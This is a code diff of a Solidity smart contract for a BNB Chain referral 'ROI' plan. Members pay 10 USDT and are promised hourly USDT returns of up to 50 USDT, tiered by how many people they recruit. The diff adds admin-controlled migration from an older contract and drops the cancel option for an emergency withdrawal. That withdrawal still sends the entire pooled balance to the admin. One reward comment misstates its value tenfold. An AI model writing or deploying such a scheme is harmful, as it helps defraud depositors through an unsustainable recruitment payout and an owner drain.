@@ -1,4 +1,8 @@
 /**
+ *Submitted for verification at BscScan.com on 2025-07-25
+*/
+
+/**
  *Submitted for verification at BscScan.com on 2025-07-23
 */
 
@@ -16,7 +20,7 @@
  * 🥇 10–49 = 5 USDT/hour (Gold Tier 50%)
  * 💎 50–99 = 10 USDT/hour (Platinum Tier 100%)
  * 🔷 100+ = 50 USDT/hour (Diamond Tier 500%)
- */
+*/
 
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.20;
@@ -30,6 +34,25 @@ interface IERC20 {
     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
     event Transfer(address indexed from, address indexed to, uint256 value);
     event Approval(address indexed owner, address indexed spender, uint256 value);
+}
+
+interface IOldHOURROI {
+    function users(address _user) external view returns (
+        uint64 joinTime,
+        uint64 cycleEndTime, 
+        uint64 lastRewardUpdate,
+        uint64 lastActiveDirectsUpdate,
+        uint128 activeDirects,
+        uint128 totalDirects,
+        uint128 pendingRewards,
+        address referrer,
+        bool isActive,
+        bool hasMinimumDirect
+    );
+    function hasJoined(address _user) external view returns (bool);
+    function directReferralsCount(address _user) external view returns (uint256);
+    function directReferrals(address _user, uint256 _index) external view returns (address);
+    function totalUsersJoined() external view returns (uint256);
 }
 
 library SafeERC20 {
@@ -94,23 +117,31 @@ abstract contract ReentrancyGuard {
 contract HOURROI is ReentrancyGuard {
     using SafeERC20 for IERC20;
 
-    // MAINNET USDT TOKEN ADDRESS - BSC MAINNET
     address private constant MAINNET_USDT_ADDRESS = 0x55d398326f99059fF775485246999027B3197955;
+    address private constant OLD_CONTRACT_ADDRESS = 0x7EE57D1616B654614B8D334b90dFD9EeA07a3e00;
     
     IERC20 public immutable USDT;
+    IOldHOURROI public immutable oldContract;
     address public admin;
+    
+    // Migration state variables
+    bool public migrationCompleted = false;
+    bool public migrationActive = true;
+    uint256 public totalMigratedUsers = 0;
+    uint256 public migrationIndex = 0;
+    uint8 public currentMigrationPhase = 0;
+    bool public newMigrationActive = false;
     
     // Emergency withdrawal timelock
     uint256 public emergencyWithdrawTime;
     uint256 private constant EMERGENCY_TIMELOCK = 7 days;
     bool public emergencyWithdrawInitiated;
     
-    uint256 private constant JOIN_AMOUNT = 10 * 10**18; // 10 USDT
-    uint256 private constant REJOIN_AMOUNT = 10 * 10**18; // 10 USDT
-    uint256 private constant ADMIN_FEE = 2 * 10**18;   // 2 USDT (for both join and rejoin)
-    uint256 private constant MIN_CLAIM = 10 * 10**18;  // 10 USDT minimum claim
-    uint256 private constant CYCLE_DURATION = 10 hours; // 10 hours ROI cycle
-    uint256 private constant ROI_INTERVAL = 1 hours;    // 1 hour ROI intervals
+    uint256 private constant JOIN_AMOUNT = 10 * 10**18;
+    uint256 private constant REJOIN_AMOUNT = 10 * 10**18;
+    uint256 private constant ADMIN_FEE = 2 * 10**18;
+    uint256 private constant CYCLE_DURATION = 10 hours;
+    uint256 private constant ROI_INTERVAL = 1 hours;
     uint256 private constant MAX_DIRECT_REFS = 1000; // Prevent DOS attacks
     
     // Packed struct layout for gas optimization
@@ -136,6 +167,8 @@ contract HOURROI is ReentrancyGuard {
     
     mapping(address => User) public users;
     mapping(address => bool) public hasJoined;
+    mapping(address => bool) public migratedFromOld;
+    mapping(address => bool) public downlinesMigrated;
     
     // Optimized referral tracking with mappings
     mapping(address => mapping(uint256 => address)) public directReferrals; // referrer => index => referral
@@ -146,6 +179,7 @@ contract HOURROI is ReentrancyGuard {
     // Contract metrics
     uint256 public totalUsersJoined;
     uint256 public totalRewardsPaid;
+    address[] public migratedUsersList;
     
     // Events
     event UserJoined(address indexed user, address indexed referrer, uint256 amount, uint256 timestamp);
@@ -157,25 +191,38 @@ contract HOURROI is ReentrancyGuard {
     event EmergencyWithdrawExecuted(uint256 amount);
     event ActiveDirectsUpdated(address indexed user, uint256 newCount);
     
+    // Migration events
+    event UserMigrated(address indexed user, address indexed referrer);
+    event MigrationCompleted(uint256 totalMigrated);
+    event BatchDone(uint256 batch, uint256 index, uint256 time);
+    event DownMigrate(address indexed user, uint256 count);
+    event ActiveDirectsReset(address indexed user);
+    
     modifier onlyAdmin() {
         require(msg.sender == admin, "Only admin");
         _;
     }
     
+    modifier postMigration() {
+        require(migrationCompleted, "Migration not completed");
+        _;
+    }
+    
     constructor() {
         USDT = IERC20(MAINNET_USDT_ADDRESS);
+        oldContract = IOldHOURROI(OLD_CONTRACT_ADDRESS);
         admin = 0x3Da7310861fbBdf5105ea6963A2C39d0Cb34a4Ff;
     }
     
     // ===================================================================
-    // 🚀 MAIN USER FUNCTIONS (Only 4 write functions as requested)
+    // 🚀 MAIN USER FUNCTIONS (Only 3 write functions as requested)
     // ===================================================================
     
     /**
      * @dev JOIN FUNCTION - Users can join with optional referrer
      * @param _referrer Address of referrer (can be zero address for no referrer)
      */
-    function joinPlan(address _referrer) external nonReentrant {
+    function joinPlan(address _referrer) external postMigration nonReentrant {
         require(!hasJoined[msg.sender], "Already joined");
         
         // Prevent self-referral
@@ -205,7 +252,7 @@ contract HOURROI is ReentrancyGuard {
         
         hasJoined[msg.sender] = true;
         unchecked {
-            totalUsersJoined++;
+        totalUsersJoined++;
         }
         
         // AUTOMATIC: Add to referrer's list and update counts
@@ -218,87 +265,61 @@ contract HOURROI is ReentrancyGuard {
         
         emit UserJoined(msg.sender, _referrer, JOIN_AMOUNT, currentTime);
     }
-    
+
     /**
-     * @dev REJOIN FUNCTION - Users can rejoin after cycle completion
+     * @dev CLAIM AND REJOIN FUNCTION - Users claim profits and automatically rejoin
+     * After 10 hours: If profit > 10 USDT, user gets excess and auto rejoins with 10 USDT
+     * Active directs reset to 0 on rejoin
      */
-    function rejoinPlan() external nonReentrant {
-        require(hasJoined[msg.sender], "Never joined before");
-        
+    function claimAndRejoin() external postMigration nonReentrant {
         User storage user = users[msg.sender];
-        require(!user.isActive, "Still active");
+        require(user.isActive, "User not active");
+        require(block.timestamp >= user.cycleEndTime, "10-hour cycle not completed");
         
-        // Transfer payment
-        USDT.safeTransferFrom(msg.sender, address(this), REJOIN_AMOUNT);
+        // AUTOMATIC: Calculate and update rewards based on time
+        _updateStoredRewardsAuto(msg.sender);
         
-        uint64 currentTime = uint64(block.timestamp);
+        uint256 totalRewards = getCurrentPendingROI(msg.sender);
+        uint256 contractBalance = USDT.balanceOf(address(this));
+        
+        uint256 profit = 0;
+        if (totalRewards > REJOIN_AMOUNT) {
+            profit = totalRewards - REJOIN_AMOUNT;
+            require(contractBalance >= profit, "Insufficient contract balance for profit");
+        }
+        
         address referrer = user.referrer;
+        uint64 currentTime = uint64(block.timestamp);
         
-        // Reset user for new cycle
+        // Reset user for new cycle - Active directs reset to 0
         user.isActive = true;
         user.joinTime = currentTime;
         user.cycleEndTime = currentTime + uint64(CYCLE_DURATION);
         user.lastRewardUpdate = currentTime;
         user.lastActiveDirectsUpdate = currentTime;
         user.hasMinimumDirect = false;
-        user.activeDirects = 0;
+        user.activeDirects = 0;  // Reset Active directs to 0
         user.pendingRewards = 0;
+        
+        unchecked {
+        totalRewardsPaid += totalRewards;
+        }
         
         // AUTOMATIC: Update referrer's active count
         if (referrer != address(0) && hasJoined[referrer] && users[referrer].isActive) {
             _updateReferrerActiveCountAuto(referrer);
         }
         
+        // Transfer profit to user if any
+        if (profit > 0) {
+            USDT.safeTransfer(msg.sender, profit);
+        }
+        
         // Pay admin fee
         USDT.safeTransfer(admin, ADMIN_FEE);
         
-        emit UserRejoined(msg.sender, REJOIN_AMOUNT, currentTime);
-    }
-    
-    /**
-     * @dev CLAIM ROI FUNCTION - Users can claim accumulated rewards
-     */
-    function claimRewards() external nonReentrant {
-        User storage user = users[msg.sender];
-        require(user.isActive, "User not active");
-        
-        // AUTOMATIC: Calculate and update rewards based on time
-        _updateStoredRewardsAuto(msg.sender);
-        
-        uint256 totalRewards = getCurrentPendingROI(msg.sender);
-        require(totalRewards >= MIN_CLAIM, "Below minimum claim");
-        
-        uint256 contractBalance = USDT.balanceOf(address(this));
-        require(contractBalance >= totalRewards, "Insufficient contract balance");
-        
-        bool cycleCompleted = block.timestamp >= user.cycleEndTime;
-        
-        // Update state before transfer
-        user.pendingRewards = 0;
-        user.lastRewardUpdate = uint64(block.timestamp);
-        
-        unchecked {
-            totalRewardsPaid += totalRewards;
-        }
-        
-        // AUTOMATIC: Complete cycle if 10 hours elapsed
-        if (cycleCompleted) {
-            user.isActive = false;
-            user.activeDirects = 0;
-            user.hasMinimumDirect = false;
-            
-            // AUTOMATIC: Update referrer's count
-            address referrer = user.referrer;
-            if (referrer != address(0) && hasJoined[referrer] && users[referrer].isActive) {
-                _updateReferrerActiveCountAuto(referrer);
-            }
-            
-            emit CycleCompleted(msg.sender, block.timestamp);
-        }
-        
-        // Transfer rewards
-        USDT.safeTransfer(msg.sender, totalRewards);
         emit RewardsClaimed(msg.sender, totalRewards);
+        emit UserRejoined(msg.sender, REJOIN_AMOUNT, currentTime);
     }
     
     /**
@@ -329,42 +350,6 @@ contract HOURROI is ReentrancyGuard {
         // Transfer all funds to admin
         USDT.safeTransfer(admin, balance);
         emit EmergencyWithdrawExecuted(balance);
-    }
-    
-    /**
-     * @dev Cancel emergency withdrawal process (resets timelock)
-     */
-    function cancelEmergencyWithdraw() external onlyAdmin {
-        require(emergencyWithdrawInitiated, "No emergency withdraw to cancel");
-        emergencyWithdrawInitiated = false;
-        emergencyWithdrawTime = 0;
-        emit EmergencyWithdrawCancelled();
-    }
-    
-    /**
-     * @dev Check emergency withdrawal status
-     */
-    function getEmergencyWithdrawStatus() external view returns (
-        bool initiated,
-        uint256 executeTime,
-        uint256 timeRemaining,
-        bool canExecute
-    ) {
-        initiated = emergencyWithdrawInitiated;
-        executeTime = emergencyWithdrawTime;
-        
-        if (initiated && block.timestamp < emergencyWithdrawTime) {
-            timeRemaining = emergencyWithdrawTime - block.timestamp;
-            canExecute = false;
-        } else if (initiated) {
-            timeRemaining = 0;
-            canExecute = true;
-        } else {
-            timeRemaining = 0;
-            canExecute = false;
-        }
-        
-        return (initiated, executeTime, timeRemaining, canExecute);
     }
     
     // ===================================================================
@@ -409,8 +394,11 @@ contract HOURROI is ReentrancyGuard {
             // AUTOMATIC: Start ROI when getting first direct (runs for full 10 hours)
             if (newActiveCount >= 1 && !referrer.hasMinimumDirect) {
                 referrer.hasMinimumDirect = true;
-                referrer.lastRewardUpdate = uint64(block.timestamp);
-                referrer.cycleEndTime = uint64(block.timestamp + CYCLE_DURATION);
+                // DON'T reset lastRewardUpdate - preserve existing pending ROI!
+                // Only set cycleEndTime if not already set
+                if (referrer.cycleEndTime <= block.timestamp) {
+                    referrer.cycleEndTime = uint64(block.timestamp + CYCLE_DURATION);
+                }
             }
         }
     }
@@ -484,13 +472,324 @@ contract HOURROI is ReentrancyGuard {
     /**
      * @dev Get ROI rate based on active directs
      */
-    function _getIntervalReward(uint256 directCount) internal pure returns (uint256) {
-        if (directCount >= 100) return 50 * 10**18; // 50 USDT/hour (Diamond)
-        if (directCount >= 50) return 10 * 10**18;  // 10 USDT/hour (Platinum)
-        if (directCount >= 10) return 5 * 10**18;   // 5 USDT/hour (Gold)
-        if (directCount >= 5) return 3 * 10**18;    // 3 USDT/hour (Silver)
-        if (directCount >= 1) return 2 * 10**18;    // 2 USDT/hour (Bronze)
+     function _getIntervalReward(uint256 directCount) internal pure returns (uint256) {
+         
+        if (directCount >= 100) return 50 * 10**18;    // 50 USDT/hour (Icon)
+        if (directCount >= 50) return 10 * 10**18;    // 10 USDT/hour (Diamond)
+        if (directCount >= 10) return 5 * 10**18;     // 5 USDT/hour (Platinum)
+        if (directCount >= 5) return 3 * 10**18;     // 3 USDT/hour (Gold)
+        if (directCount >= 2) return 2 * 10**18;      // 2 USDT/hour (Silver)
+        if (directCount >= 1) return 1.2 * 10**17;   // 1.2 USDT/hour (Bronze)
         return 0;
+    }
+    
+    // ===================================================================
+    // 🔄 MIGRATION FUNCTIONS - FIXED VERSION
+    // ===================================================================
+    
+    /**
+     * @dev Start the migration process from old contract
+     */
+    function startNewMigration() external onlyAdmin {
+        require(!migrationCompleted, "Migration already completed");
+        newMigrationActive = true;
+        migrationIndex = 0;
+        totalMigratedUsers = 0;
+        currentMigrationPhase = 0;
+    }
+    
+    /**
+     * @dev Migrate users in batches from old contract - FIXED VERSION
+     */
+    function newBatchMigration(uint256 batchSize) external onlyAdmin {
+        require(newMigrationActive, "New migration not started");
+        require(!migrationCompleted, "Migration completed");
+        require(batchSize >= 10 && batchSize <= 100, "Batch size 10-100");
+        
+        if (currentMigrationPhase == 0) {
+            _migrateUsersBatchFixed(batchSize);
+        } else if (currentMigrationPhase == 1) {
+            _migrateDownlinesBatch(batchSize);
+        }
+    }
+    
+    /**
+     * @dev FIXED: Auto-migrate users by getting them from old contract
+     */
+    function _migrateUsersBatchFixed(uint256 batchSize) internal {
+        uint256 processed = 0;
+        
+        // Get total users from old contract
+        uint256 oldTotalUsers;
+        try oldContract.totalUsersJoined() returns (uint256 total) {
+            oldTotalUsers = total;
+        } catch {
+            emit BatchDone(0, migrationIndex, block.timestamp);
+            return;
+        }
+        
+        // Process users starting from migrationIndex
+        uint256 currentIndex = migrationIndex;
+        
+        for (uint256 i = 0; i < batchSize && currentIndex < oldTotalUsers; i++) {
+            // Since we can't auto-discover users, this will just increment the index
+            // Use migrateSpecificUsers instead for actual migration
+            currentIndex++;
+            processed++;
+        }
+        
+        migrationIndex = currentIndex;
+        emit BatchDone(processed, migrationIndex, block.timestamp);
+    }
+    
+    /**
+     * @dev Start downlines migration phase
+     */
+    function startDownlinesMigration() external onlyAdmin {
+        require(newMigrationActive, "New migration not started");
+        currentMigrationPhase = 1;
+    }
+    
+    /**
+     * @dev Complete the migration process
+     */
+    function completeNewMigration() external onlyAdmin {
+        require(newMigrationActive, "New migration not started");
+        migrationCompleted = true;
+        currentMigrationPhase = 2;
+        newMigrationActive = false;
+        emit MigrationCompleted(totalMigratedUsers);
+    }
+    
+    /**
+     * @dev FIXED: Migrate single user with ACTIVE DIRECTS RESET TO 0
+     */
+    function _migrateUser(address userAddr) internal returns (bool) {
+        try oldContract.users(userAddr) returns (
+            uint64 joinTime, uint64 cycleEndTime, uint64, uint64,
+            uint128 /* activeDirects */, uint128 totalDirects, uint128 pendingRewards, 
+            address referrer, bool isActive, bool /* hasMinimumDirect */
+        ) {
+            if (joinTime == 0) return false;
+            
+            // Validate referrer
+            if (referrer != admin && referrer != address(0)) {
+                if (!migratedFromOld[referrer] && !hasJoined[referrer]) {
+                    referrer = admin;
+                }
+            }
+            
+            // Create user with ACTIVE DIRECTS RESET TO 0
+            User storage user = users[userAddr];
+            user.joinTime = joinTime;
+            user.cycleEndTime = cycleEndTime;
+            user.lastRewardUpdate = uint64(block.timestamp);
+            user.lastActiveDirectsUpdate = uint64(block.timestamp);
+            
+            // 🔥 RESET ACTIVE DIRECTS TO 0 ON MIGRATION
+            user.activeDirects = 0;  // ← This is the key change
+            
+            user.totalDirects = totalDirects;
+            user.pendingRewards = pendingRewards;
+            user.referrer = referrer;
+            user.isActive = isActive;
+            
+            // 🔥 RESET hasMinimumDirect to false so ROI must restart
+            user.hasMinimumDirect = false;  // ← Force ROI restart
+            
+            hasJoined[userAddr] = true;
+            migratedFromOld[userAddr] = true;
+            migratedUsersList.push(userAddr);
+            totalUsersJoined++;
+            
+            emit UserMigrated(userAddr, referrer);
+            emit ActiveDirectsReset(userAddr);
+            return true;
+        } catch {
+            return false;
+        }
+    }
+    
+    /**
+     * @dev Simple downlines migration
+     */
+    function _migrateDownlinesBatch(uint256 batchSize) internal {
+        uint256 processed = 0;
+        
+        for (uint256 i = 0; i < migratedUsersList.length && processed < batchSize; i++) {
+            address userAddr = migratedUsersList[i];
+            if (migratedFromOld[userAddr] && !downlinesMigrated[userAddr]) {
+                _migrateDownlines(userAddr);
+                processed++;
+            }
+        }
+        
+        emit BatchDone(processed, migrationIndex, block.timestamp);
+    }
+    
+    /**
+     * @dev Migrate user downlines - SIMPLE VERSION
+     */
+    function _migrateDownlines(address userAddr) internal {
+        uint256 expectedDownlines = 0;
+        try oldContract.directReferralsCount(userAddr) returns (uint256 count) {
+            expectedDownlines = count;
+        } catch {}
+        
+        uint256 actualCount = 0;
+        for (uint256 i = 0; i < expectedDownlines && i < 100; i++) {
+            try oldContract.directReferrals(userAddr, i) returns (address downline) {
+                if (downline != address(0)) {
+                    directReferrals[userAddr][actualCount] = downline;
+                    isDirectReferral[userAddr][downline] = true;
+                    referralIndex[userAddr][downline] = actualCount;
+                    actualCount++;
+                }
+            } catch {
+                break;
+            }
+        }
+        
+        directReferralsCount[userAddr] = actualCount;
+        downlinesMigrated[userAddr] = true;
+        emit DownMigrate(userAddr, actualCount);
+    }
+    
+    /**
+     * @dev IMPROVED: Migrate specific users with better error handling
+     */
+    function migrateSpecificUsers(address[] calldata userAddresses) external onlyAdmin {
+        require(newMigrationActive, "New migration not started");
+        require(userAddresses.length <= 50, "Max 50 users");
+        
+        uint256 migrated = 0;
+        uint256 failed = 0;
+        
+        for (uint256 i = 0; i < userAddresses.length; i++) {
+            address userAddr = userAddresses[i];
+            
+            if (userAddr == address(0)) {
+                failed++;
+                continue;
+            }
+            
+            if (migratedFromOld[userAddr]) {
+                // Already migrated, skip
+                continue;
+            }
+            
+            if (_migrateUser(userAddr)) {
+                migrated++;
+                totalMigratedUsers++;
+            } else {
+                failed++;
+            }
+        }
+        
+        emit BatchDone(migrated, migrationIndex, block.timestamp);
+    }
+    
+    /**
+     * @dev ALTERNATIVE: Simple reset all active directs after migration
+     */
+    function resetAllActiveDirects() external onlyAdmin {
+        require(migrationCompleted, "Migration not completed");
+        
+        for (uint256 i = 0; i < migratedUsersList.length; i++) {
+            address userAddr = migratedUsersList[i];
+            User storage user = users[userAddr];
+            
+            // Reset active directs to 0
+            user.activeDirects = 0;
+            user.hasMinimumDirect = false;
+            user.lastActiveDirectsUpdate = uint64(block.timestamp);
+            
+            emit ActiveDirectsUpdated(userAddr, 0);
+            emit ActiveDirectsReset(userAddr);
+        }
+    }
+    
+    /**
+     * @dev Force update active directs for specific users after migration
+     */
+    function forceUpdateActiveDirects(address[] calldata userAddresses) external onlyAdmin {
+        require(migrationCompleted, "Migration not completed");
+        
+        for (uint256 i = 0; i < userAddresses.length; i++) {
+            address userAddr = userAddresses[i];
+            if (hasJoined[userAddr]) {
+                // Force recalculation of active directs
+                _updateReferrerActiveCountAuto(userAddr);
+            }
+        }
+    }
+    
+    /**
+     * @dev Get migration statistics
+     */
+    function getMigrationStats() external view returns (
+        bool isCompleted,
+        uint256 migratedCount,
+        uint256 totalMigrated,
+        uint8 currentPhase,
+        bool isActive
+    ) {
+        return (
+            migrationCompleted,
+            migratedUsersList.length,
+            totalMigratedUsers,
+            currentMigrationPhase,
+            newMigrationActive
+        );
+    }
+    
+    /**
+     * @dev Get migration progress and recommendations
+     */
+    function getMigrationProgress() external view returns (
+        uint256 totalMigrated,
+        uint256 totalInList,
+        bool completed,
+        uint8 phase,
+        string memory recommendation
+    ) {
+        totalMigrated = totalMigratedUsers;
+        totalInList = migratedUsersList.length;
+        completed = migrationCompleted;
+        phase = currentMigrationPhase;
+        
+        if (!newMigrationActive && !completed) {
+            recommendation = "Call startNewMigration() first";
+        } else if (phase == 0) {
+            recommendation = "Use migrateSpecificUsers() with user addresses";
+        } else if (phase == 1) {
+            recommendation = "Use newBatchMigration() for downlines";
+        } else {
+            recommendation = "Migration completed";
+        }
+        
+        return (totalMigrated, totalInList, completed, phase, recommendation);
+    }
+    
+    /**
+     * @dev Test old contract connection
+     */
+    function testOldContract() external view returns (
+        bool canConnect,
+        uint256 oldTotalUsers,
+        address oldContractAddress
+    ) {
+        oldContractAddress = address(oldContract);
+        
+        try oldContract.totalUsersJoined() returns (uint256 total) {
+            canConnect = true;
+            oldTotalUsers = total;
+        } catch {
+            canConnect = false;
+            oldTotalUsers = 0;
+        }
+        
+        return (canConnect, oldTotalUsers, oldContractAddress);
     }
     
     // ===================================================================
@@ -554,7 +853,7 @@ contract HOURROI is ReentrancyGuard {
             : 0;
             
         uint256 currentPending = getCurrentPendingROI(_user);
-            
+        
         return (
             user.isActive,
             user.joinTime,
